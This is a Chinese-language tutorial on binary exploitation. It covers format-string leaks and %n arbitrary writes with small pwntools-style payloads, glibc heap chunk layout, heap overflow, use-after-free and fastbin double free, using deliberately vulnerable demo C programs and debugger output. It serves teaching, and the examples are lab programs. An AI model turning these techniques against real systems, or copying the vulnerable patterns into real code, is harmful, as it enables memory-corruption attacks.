
# 格式化字符串漏洞

## 介绍

格式化字符串函数可以接受可变数量的参数，并将**第一个参数作为格式化字符串，根据其来解析之后的参数**
通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C/C++ 程序都会利用格式化字符串函数来**输出信息，调试程序，或者处理字符串**
一般来说，格式化字符串在利用的时候主要分为三个部分

- 格式化字符串函数
- 格式化字符串
- 后续参数，**可选**

## 含有格式化字符串的**函数**

- 输入
    - scanf
- 输出
    - printf: 输出到 stdout
    - fprintf: 输出到指定 FILE 流
    - vprintf: 根据参数列表格式化输出到 stdout
    - vfprintf: 根据参数列表格式化输出到指定 FILE 流
    - sprintf: 输出到字符串
    - snprintf: 输出指定字节数到字符串
    - vsprintf: 根据参数列表格式化输出到字符串
    - vsnprintf: 根据参数列表格式化输出指定字节到字符串
    - setproctitle: 设置 argv
    - syslog: 输出日志

## 基本格式

格式化字符串的格式的基本格式为

```
%[parameter][flags][field width][.precision][length]type
```

有几个是比较重要的

- parameter
    - n$，获取格式化字符串中的指定参数
- flag
- field width
    - 输出的最小宽度
- precision
    - 输出的最大长度
- length，输出的长度
    - hh，输出一个字节
    - h，输出一个双字节
- type
    - d/i，有符号整数
    - u，无符号整数
    - x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。
    - o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。
    - s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。
    - c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。
    - p， void * 型，输出对应变量的值。printf("%p",a) 用地址的格式打印变量 a 的值，printf("%p", &a) 打印变量 a 所在的地址。
    - n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。
    - %， '`%`'字面值，不接受任何 flags, width。

## 原理

- 32位

在32位下，函数调用的参数传递是通过栈来实现的，根据cdecl的函数调用规定，函数的从最右边的参数开始，逐个压栈。printf并不知道调用者实际传递了多少个参数，因此需要通过格式化字符串来指定有多少参数被传递进来。这样子就会导致如果传递的参数的数量和printf函数中指定的参数数量并不一致时，会发生意外的情况。

如下面这个程序，格式化字符串中两个参数需要被打印，但是只传递了一个参数 `a`

```c
#include <stdio.h>

int main()
{
    int a = 10;
    printf("%d %d", a);
}
```

那么在输出的时候，打印了 `10` 后，会继续在栈上面寻找传入的参数进行打印，本次的输出为

```
$ ./unmatched-params 
10 1448656856
```

打印出了两个数字，第一个数字时传入的参数，第二个是栈上面的数据，如此，栈上面的数据就被泄露了出来。如果考虑是如何导致这个原因的，参考下面这张图，从上往下是栈的增长方向

![Untitled](level-2/Untitled.png)

在解析format string的时候，会从第二个参数开始取出数据进行打印，第一个 `%d` 会取出 `a` 打印出 `10` ，第二个 `%d` 会继续在栈上面寻找数据，打印出 other data

- 64位

在64位下，参数的传递方式和32位并不完全相同，在参数数量比较少的时候，会通过寄存器来进行传递，具体是

- Linux下：从左到右的参数分别用 rdi、rsi、rdx、rcx、r8、r9 来进行传递，如果参数更多，就通过栈来传递
- Windows下：从左到右的参数分别用 rcx、rdx、rsi、rdi 来进行传递，如果参数更多，就通过栈来传递

因此如果希望能够打印出栈上的内容，在Linux下需要在格式化字符串中有至少6个参数，第6个参数开始就开始打印栈上的内容了。

## 利用

### 泄露栈内存

下面的程序直接将用户输入的字符串以格式化字符串打印出来，而不是通过其参数打印，会有内存泄露的

```c
#include <stdio.h>
int main()
{
    char s[100];
    scanf("%s", s);
    printf(s);
    return 0;
}
```

编译时gcc也会有对应的提示，指出了我们的程序中没有给出格式化字符串的参数的问题。

```
$ gcc -m32 leakmemory.c -o leakmemory            
leakmemory.c: In function 'main':
leakmemory.c:7:12: warning: format not a string literal and no format arguments [-Wformat-security]
    7 |     printf(s);
      |            ^
```

通过这个问题，可以打印出程序的栈上的内容，通过如下的输入，我们可以拿到栈上面许多的内存的值，但是具体是什么需要通过动态调试来确定

```
$ ./leakmemory
%08x.%08x.%08x.%08x
fff112f8.fff1130a.565ec228.00000000
```

这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。

### ****获取栈变量对应字符串****

通过传入 `%s` 参数，可以将栈上的内容作为字符串指针，打印出指向的字符串，但是由于程序中并不是所有的内存地址都是可以被访问、栈上内容指向的地址并不是都有效，因此需要处理好需要打印的参数是第几个

### **覆盖内存**

可以通过 `%n` 来实现往一个地址中写入内容

> %n：不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。
> 

常见的构造方法是

```
...[overwrite addr]....%[overwrite offset]$n
```

其中... 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。所以一般来说，也是如下步骤

- 确定覆盖地址
- 确定相对偏移
- 进行覆盖

在栈上，printf调用前，esp指向的是format string，下面的依次为在printf中格式化字符串的第一个参数、第二个参数。

一个例子

```c
#include <stdio.h>

int variable = 10;

int main()
{
    char tmp[128];
    scanf("%s", tmp);
    printf(tmp);

    printf("variable = %d", variable);
    return 0;
}
```

编译

```bash
gcc overwrite.c -o overwrite -no-pie -m32
```

在第一个printf前打下断点，esp指向的 `0xffffcc5c` 为格式化字符串的实际的保存的内容，为第 `(0xffffcc5c - 0xffffcc40) / 4 = 7` 个参数

![Untitled](level-2/Untitled%201.png)

对于 `%n` 而言，同样有 `%k$n` 的用法，指将在这个之前输出了的字符长度写入到第k个参数所对应的地址中。

回到上面的例子，第7个参数中的内容虽然是 12345678，但是同样可以被作为地址而解析，如果将其改为 `variable` 变量的地址，就可以修改 `variable` 变量了

首先可以找到 `variable` 的地址，由于没有pie，简化了获得地址的操作。在本次的例子中为 `0x804c024` 

```python
variable_addr = 0x804c024
p.sendline(p32(variable_addr) + b'a' * 4 + b'%7$n')
```

在图中，可以看到，esp指向的是格式化字符串的地址，而格式化字符串的地址 `0xffa5fa8c` 的前4个字节被作为了 `variable` 变量的地址，加上前面计算出，`0xffa5fa8c` 是printf的格式化字符串中第7个参数，因此 `%7$n` 会将在此之前打印出的8个字符（包括4个字节的地址与4个 `a` ）的个数，即8，写入到`0xffa5fa8c` 中。此时 `0x804c024` 还是 0xa，即10

![Untitled](level-2/Untitled%202.png)

在printf结束后，查看 `0x804c024` 的内容，变成了8

![Untitled](level-2/Untitled%203.png)

上面是一种利用方法，将addr放在了格式化字符串的最开头，但是这会有一些问题，在64位下，因为地址往往会包含 `0x00` 字节，如果地址放在最开头，会导致printf在打印时，打印到 `0x00` 时就认为是字符串结尾，停止打印。但是因为 `0x00` 往往出现在最高位上，而 `x86` 是小端序，因此如果将地址放在输入的最后，那么 `0x00` 将不会影响printf的打印

这里还是以32位来作为例子

先提供给程序这样的输入

```python
p.sendline('0123456789abcdef' * 4)
```

查看字符串的存储情况

![Untitled](level-2/Untitled%204.png)

![Untitled](level-2/Untitled%205.png)

例如说，如果我们希望能够把地址放在 `0xffb486ec` 的地方，也就是 `$eax+0x10` 处，那么对应的格式化字符串的地址的参数就是第 `0xffb486ec - 0xffb486c0 = 11` 个。`0xffb486ec`相对于字符串的偏移是 `0xffb486ec - 0xffb486dc = 16` ，也就是需要前面有16个字符。

这个时候可以构造这样的程序输入。在 `%11$n` 之前打印了4个字符，因此 `variable` 变量会被修改为4。这里使用了 `ljust` 来将字符串补齐为16的长度

```python
payload = b'aaaa%11$n'.ljust(16, b'a')
payload += p32(variable_addr)

p.sendline(payload)
```

查看被修改后的 `variable` 变量

![Untitled](level-2/Untitled%206.png)

练习：

如何在64位上进行如此的字符串格式化攻击，需要注意64位的前6个参数是通过寄存器传递的

如何写入任意大小的数字？如 `0x12345` 

- 需要注意的是，将一串很长很长输入传递给程序是不可行的。
- 可以通过 `%width c` 来实现（width和c之前没有空格，width指需要将输入的字符进行对其的宽度）

# 堆

## 堆的概述

在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。我们一般称管理堆的那部分程序为堆管理器。

几个比较常见的堆的函数

- malloc，用于申请一定字节大小的内存块
- free，用于释放掉通过malloc等函数申请得到的内存块
- calloc，与malloc相似，也用于申请一定字节大小的内存块，但是会将内存块的内存清空
- realloc，可以传入一个已分配的内存块的指针，可以对这个内存空间的指针进行重新分配大小，可以分配为比原来大或比原来小的大小。如果新的大小为0，那么相当于是free函数

堆管理器处于用户程序与内核中间，主要做以下工作

1. 响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。同时，为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互。
2. 管理用户所释放的内存。一般来说，用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。

堆有许多种实现，包括如下几个比较知名的

```
dlmalloc  – General purpose allocator
ptmalloc2 – glibc
jemalloc  – FreeBSD and Firefox
tcmalloc  – Google
libumem   – Solaris
```

后面的内容将主要以glibc的实现为主进行介绍

Linux 中早期的堆分配与回收由 Doug Lea 实现，但它在并行处理多个线程时，会共享进程的堆内存空间。因此，为了安全性，一个线程使用堆时，会进行加锁。然而，与此同时，加锁会导致其它线程无法使用堆，降低了内存分配和回收的高效性。同时，如果在多线程使用时，没能正确控制，也可能影响内存分配和回收的正确性。Wolfram Gloger 在 Doug Lea 的基础上进行改进使其可以支持多线程，这个堆分配器就是 ptmalloc 。在 glibc-2.3.x. 之后，glibc 中集成了 ptmalloc2。

目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块。

## **堆相关数据结构**

### **malloc_chunk**

在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中。

非常有意思的是，**无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构**。虽然它们使用了同一个数据结构，但是根据是否被释放，它们的表现形式会有所不同。

malloc_chunk 的结构如下

```c
/*
  This struct declaration is misleading (but accurate and necessary).
  It declares a "view" into memory allowing access to necessary
  fields at known offsets from a given base. See explanation below.
*/
struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```

其中的每一个字段的含义如下

- **prev_size**, 如果该 chunk 的**物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）**是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。**这里的前一 chunk 指的是较低地址的 chunk** 。
- **size** ，该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示
    - NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。
    - IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。
    - PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。
- **fd，bk**。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下
    - fd 指向下一个（非物理相邻）空闲的 chunk
    - bk 指向上一个（非物理相邻）空闲的 chunk
    - 通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理
- **fd_nextsize， bk_nextsize**，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。
    - fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。
    - bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。
    - 一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。**这样做可以避免在寻找合适 chunk 时挨个遍历。**

一个已经分配的 chunk 的样子如下。**我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。**

当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。**这就是 chunk 中的空间复用。**

```
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of previous chunk, if unallocated (P clear)  |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of chunk, in bytes                     |A|M|P|
  mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             User data starts here...                          .
        .                                                               .
        .             (malloc_usable_size() bytes)                      .
next    .                                                               |
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             (size of chunk, but used for application data)    |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of next chunk, in bytes                |A|0|1|
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

被释放的 chunk 被记录在链表中（可能是循环双向链表，也可能是单向链表）。具体结构如下

```
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of previous chunk, if unallocated (P clear)  |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
`head:' |             Size of chunk, in bytes                     |A|0|P|
  mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Forward pointer to next chunk in list             |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Back pointer to previous chunk in list            |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Unused space (may be 0 bytes long)                .
        .                                                               .
 next   .                                                               |
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
`foot:' |             Size of chunk, in bytes                           |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of next chunk, in bytes                |A|0|0|
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

## 堆溢出

### 原理

堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（**之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数**），因而导致了数据溢出，并覆盖到**物理相邻的高地址**的下一个堆块。

堆溢出漏洞发生的基本前提是

- 程序向堆上写入数据。
- 写入的数据大小没有被良好地控制。

与栈溢出所不同的是，堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此我们一般无法直接通过堆溢出来控制 EIP 。

一般来说，我们利用堆溢出的策略是

1. 覆盖与其**物理相邻的下一个 chunk** 的内容。
    - prev_size
    - size，主要有三个比特位，以及该堆块真正的大小。
        - NON_MAIN_ARENA
        - IS_MAPPED
        - PREV_INUSE
        - the True chunk size
    - chunk content，从而改变程序固有的执行流。
2. 利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。

### 例子

下面这个程序，在分配了一定大小的堆后进行了gets的读取，但是并没有检查长度，因此会导致写入超过这一个堆块大小的数据，造成堆溢出

```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    char *chunk;
    chunk = malloc(24);
    puts("Get input:");
    gets(chunk);
    return 0;
}
```

在gets前，chunk的内容如下，因为下一个chunk的prev_inuse是1，因此下一个chunk的prev_size是被这一个chunk所使用的

```
pwndbg> x/6gx 0x555555559290
0x555555559290: 0x0000000000000000      0x0000000000000021
0x5555555592a0: 0x0000000000000000      0x0000000000000000
0x5555555592b0: 0x0000000000000000      0x0000000000000411
```

如果输入超过了大小为24的长度的内容，就会发生堆溢出，覆盖了下一个chunk的内容

如输入 `a * 26` ，可以看到，下一个chunk的size被覆盖成了 `0x6161` 

```
pwndbg> x/6gx 0x555555559290
0x555555559290: 0x0000000000000000      0x0000000000000021
0x5555555592a0: 0x6161616161616161      0x6161616161616161
0x5555555592b0: 0x6161616161616161      0x0000000000006161
```

## Fastbin

大多数程序经常会申请以及释放一些比较小的内存块。如果将一些较小的 chunk 释放之后发现存在与之相邻的空闲的 chunk 并将它们进行合并，那么当下一次再次申请相应大小的 chunk 时，就需要对 chunk 进行分割，这样就大大降低了堆的利用效率。**因为我们把大部分时间花在了合并、分割以及中间检查的过程中。**
因此，ptmalloc 中专门设计了 fast bin，对应的变量就是 malloc state 中的 fastbinsY

```c
/*
   Fastbins

    An array of lists holding recently freed small chunks.  Fastbins
    are not doubly linked.  It is faster to single-link them, and
    since chunks are never removed from the middles of these lists,
    double linking is not necessary. Also, unlike regular bins, they
    are not even processed in FIFO order (they use faster LIFO) since
    ordering doesn't much matter in the transient contexts in which
    fastbins are normally used.

    Chunks in fastbins keep their inuse bit set, so they cannot
    be consolidated with other free chunks. malloc_consolidate
    releases all chunks in fastbins and consolidates them with
    other free chunks.
 */
typedef struct malloc_chunk *mfastbinptr;

/*
    This is in malloc_state.
    /* Fastbins */
    mfastbinptr fastbinsY[ NFASTBINS ];
*/
```

glibc 采用单向链表对其中的每个 bin 进行组织，并且**每个 bin 采取 LIFO 策略**，最近释放的 chunk 会更早地被分配。也就是说，当用户需要的 chunk 的大小小于 fastbin 的最大大小时， ptmalloc 会首先判断 fastbin 中相应的 bin 中是否有对应大小的空闲块，如果有的话，就会直接从这个 bin 中获取 chunk。如果没有的话，ptmalloc 才会做接下来的一系列操作。

## **Use After Free**

简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况

- 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。
- 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么**程序很有可能可以正常运转**。
- 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，**就很有可能会出现奇怪的问题**。

而我们一般所指的 **Use After Free** 漏洞主要是后两种。此外，**我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。**

```c
#include <stdio.h>
#include <stdlib.h>
typedef struct name
{
    char *myname;
    void (*func)(char *str);
} NAME;
void myprint(char *str) { printf("%s\n", str); }
void printmyname() { printf("call print my name\n"); }
int main()
{
    NAME *a;
    a = (NAME *)malloc(sizeof(struct name));
    a->func = myprint;
    a->myname = "I can also use it";
    a->func("this is my function");
    // free without modify
    free(a);
    a->func("I can also use it");
    // free with modify
    a->func = printmyname;
    a->func("this is my function");
    // set NULL
    a = NULL;
    printf("this pogram will crash...\n");
    a->func("can not be printed...");
}
```

在执行了free后，通过gdb查看，可以看到chunk的状态为（glibc需要在2.26之前，因为引入了tcache，tcache是双向链表，会修改结构体中的func指针为bk，导致free后的第一个调用失效，而fastbin是单向链表，只会修改myname为fd）

```
Free chunk (fastbins) | PREV_INUSE
Addr: 0x55555555b000
Size: 0x21
fd: 0x00
```

但是对于这个chunk的修改仍然是可以的

程序的输出为

```
$ ./uaf        
this is my function
I can also use it
call print my name
this pogram will crash...
[1]    10983 segmentation fault  ./uaf
```

## **Fastbin Double Free**

Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。

Fastbin Double Free 能够成功利用主要有两部分的原因

1. fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空
2. fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。

对于第二点，考虑如下的程序

```c
#include <stdlib.h>

int main(void)
{
    void *chunk1, *chunk2, *chunk3;
    chunk1 = malloc(0x10);
    chunk2 = malloc(0x10);

    free(chunk1);
    free(chunk1);
    return 0;
}
```

执行后的结果是

```
$ ./doublefree-broken              
*** Error in `./doublefree-broken': double free or corruption (fasttop): 0x0000565343d24010 ***
[1]    29642 abort      ./doublefree-broken
```

这是因为在第一次free后，chunk1在fastbin链表的头部，再次释放chunk1会无法通过如下的检查

```c
/* Another simple check: make sure the top of the bin is not the
       record we are going to add (i.e., double free).  */
    if (__builtin_expect (old == p, 0))
      {
        errstr = "double free or corruption (fasttop)";
        goto errout;
}
```

但是只需要保证在fastbin链表头部的chunk并不是当前需要重新释放的chunk即可，也就是下面的程序，在重新释放chunk1的前，释放了chunk2，这样子fastbin链表的头部就是chunk2，而不是现在需要重新释放的chunk1，绕过了上面的检查

```c
#include <stdlib.h>

int main(void)
{
    void *chunk1, *chunk2, *chunk3;
    chunk1 = malloc(0x10);
    chunk2 = malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);
    return 0;
}
```

第一个free后

```
fastbins
0x20: 0x55555555b000 ◂— 0x0
```

![Untitled](level-2/Untitled%207.png)

第二个free后，chunk2已经变成了链表的头，这个时候再free chunk1就是可以的

```
fastbins
0x20: 0x55555555b020 —▸ 0x55555555b000 ◂— 0x0
```

![Untitled](level-2/Untitled%208.png)

第三个free后，出现了环

```
fastbins
0x20: 0x55555555b000 —▸ 0x55555555b020 ◂— 0x55555555b000
```

在图中的两个chunk1实际上是同一个chunk

![Untitled](level-2/Untitled%209.png)

在能够fastbin double free后，可以将同一个chunk malloc出多次，或者修改fd指针，使得将指针指向任意地址

```c
#include <stdlib.h>
#include <stdio.h>

int main(void)
{
    void *chunk1, *chunk2, *chunk3;
    chunk1 = malloc(0x10);
    chunk2 = malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);

    char *p1 = malloc(0x10);
    char *p2 = malloc(0x10);

    *(unsigned long long *)p1 = 0x10000;

    char *p3 = malloc(0x10);

    return 0;
}
```

 在这一个程序中，修改了p1的chunk的fd，使得在最后一个malloc之后，fastbin的链表中并不是0，而是指向了0x10000，如果能够指向有意义的地址，那么在下一次fastbin分配的时候，就可以将对应地址作为chunk取出，从而实现任意地址写入

```
fastbins
0x20: 0x10000
```
